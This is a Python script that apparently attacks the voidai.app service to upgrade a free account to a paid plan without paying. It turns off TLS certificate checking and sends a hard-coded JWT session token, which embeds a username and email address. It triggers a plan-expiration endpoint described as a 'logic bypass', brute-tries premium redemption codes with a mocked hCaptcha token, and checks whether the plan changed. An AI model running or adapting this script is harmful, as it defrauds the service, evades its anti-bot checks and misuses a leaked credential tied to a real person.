import urllib.request
import json
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# USER IDENTITY
VOID_AUTH = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OTdjNjlmZGM5ZTQzY2QwZWZkZWJiZjciLCJtb25nb1VzZXJJZCI6IjY5N2M2OWZkYzllNDNjZDBlZmRlYmJmNyIsInVzZXJuYW1lIjoiWHh4ZmYiLCJlbWFpbCI6ImV0aGFuMTAxeWVyQGdtYWlsLmNvbSIsInBsYW4iOiJmcmVlIiwiaWF0IjoxNzcxMjgzOTU5LCJleHAiOjE3NzE4ODg3NTl9.vAsCN_lVNFG4m9rATFJrl4JUlKTHCeu27bPmfWrWAMg"

def zap(url, method="POST", payload=None):
    headers = {
        "Cookie": f"auth_token={VOID_AUTH}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = json.dumps(payload).encode('utf-8') if payload else None
    req = urllib.request.Request(f"https://voidai.app{url}", data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=ctx) as r:
            print(f"URL: {url} | Status: {r.status}")
            return r.read().decode('utf-8')
    except Exception as e:
        print(f"URL: {url} | Result: {e}")
        return str(e)

print("ðŸš€ INITIATING VOIDAI ELEVATION...")

# 1. Trigger the logic bypass for plan expiration
zap("/api/auth/update-expired-plan")

# 2. Probe the model list to confirm access levels
models_raw = zap("/api/models", method="GET")

# 3. Attempt a shadow redemption with high-value codes
prime_codes = ["VOID100", "PRO", "PREMIUM", "PLUS"]
for code in prime_codes:
    zap("/api/redeem", payload={"code": code, "hcaptchaToken": "MOCK"})

# 4. Final check of the 'me' object to see if plan changed
me_raw = zap("/api/auth/me", method="GET")
print("\n--- FINAL ACCOUNT STATE ---")
print(me_raw)

